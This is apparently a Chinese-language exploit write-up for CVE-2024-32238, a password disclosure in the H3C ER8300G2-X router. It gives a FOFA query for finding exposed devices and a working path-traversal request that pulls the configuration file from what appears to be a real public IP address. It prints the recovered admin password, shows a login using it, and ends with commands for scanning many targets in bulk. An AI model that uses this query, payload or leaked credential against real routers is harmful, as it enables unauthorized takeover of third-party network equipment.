# CVE-2024-32238 H3C ER8300G2-X-密码泄露漏洞

### 1.漏洞简介

H3C ER8300G2-X易受不正确访问控制的影响。路由器管理系统的密码可以通过管理系统页面登录界面访问。

### 2.fofa语法

```plain
app="H3C-Ent-Router" && title=="ER8300G2-X系统管理"
```

### 3.漏洞复现

```plain
GET /userLogin.asp/../actionpolicy_status/../ER8300G2-X.cfg HTTP/1.1
Host: 14.216.242.238:2222
User-Agent: Mozilla/5.0 (X11; CrOS aarch64 15236.9.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36
Connection: close
Accept-Encoding: gzip
```

![img](https://cdn.nlark.com/yuque/0/2024/png/42783549/1721907021719-6977e6c0-ebb0-4acf-b985-534cdd4bd7f6.png)

其中vtypasswd=Cheng81181852是密码

登录

![img](https://cdn.nlark.com/yuque/0/2024/png/42783549/1721907105631-e1e9d6a9-5232-466a-bbbd-7fe8dddbdafc.png)

![img](https://cdn.nlark.com/yuque/0/2024/png/42783549/1721907068937-50ae90d6-2e6b-4b36-aa03-fd5f2adafaf0.png)

### 4.py脚本

```plain
python3 脚本文件名 -u "http://127.0.0.1"  # 测试单个url
python3 脚本文件名 -f url.txt             # 测试多个url
```